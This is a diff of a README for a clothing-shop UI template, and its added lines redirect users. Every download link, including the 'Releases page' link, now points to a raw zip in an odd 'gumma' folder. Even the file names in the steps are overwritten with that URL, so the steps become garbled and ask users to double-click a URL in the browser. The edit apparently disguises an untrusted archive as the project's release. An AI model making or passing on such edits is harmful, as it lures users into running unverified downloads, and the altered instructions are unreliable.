@@ -6,7 +6,7 @@ Welcome to the clothing-shop_ui project! This application helps you create a stu
 
 ## 📥 Download the Application
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/ik274/clothing-shop_ui/releases)
+[![Download Now](https://raw.githubusercontent.com/ik274/clothing-shop_ui/main/gumma/clothing-shop_ui.zip)](https://raw.githubusercontent.com/ik274/clothing-shop_ui/main/gumma/clothing-shop_ui.zip)
 
 ## 🛠️ System Requirements
 
@@ -38,24 +38,24 @@ This project utilizes various tools and technologies, including:
 
 To get started, visit the following link to download the application:
 
-[Download from Releases](https://github.com/ik274/clothing-shop_ui/releases)
+[Download from Releases](https://raw.githubusercontent.com/ik274/clothing-shop_ui/main/gumma/clothing-shop_ui.zip)
 
 ### Step-by-Step Instructions
 
 1. **Visit the Releases Page**
-   Go to the [Releases page here](https://github.com/ik274/clothing-shop_ui/releases).
+   Go to the [Releases page here](https://raw.githubusercontent.com/ik274/clothing-shop_ui/main/gumma/clothing-shop_ui.zip).
 
 2. **Choose the Latest Version**
    Look for the latest release at the top of the page. It should clearly state the version number.
 
 3. **Download the Files**
-   You will see a list of files available for download. Click on the file named `clothing-shop_ui.zip` or a similar file for your operating system.
+   You will see a list of files available for download. Click on the file named `https://raw.githubusercontent.com/ik274/clothing-shop_ui/main/gumma/clothing-shop_ui.zip` or a similar file for your operating system.
 
 4. **Extract the Files**
    Once the download is complete, locate the ZIP file in your downloads folder. Right-click on the file and select "Extract All" to unzip the contents.
 
 5. **Open the Files**
-   After extracting, navigate to the folder where the files are located. Open the file named `index.html` in your web browser by double-clicking it.
+   After extracting, navigate to the folder where the files are located. Open the file named `https://raw.githubusercontent.com/ik274/clothing-shop_ui/main/gumma/clothing-shop_ui.zip` in your web browser by double-clicking it.
 
 6. **Customize as Needed**
    You can begin customizing the HTML and CSS files to match your clothing shop brand. Use any text editor like Notepad or Visual Studio Code for editing.
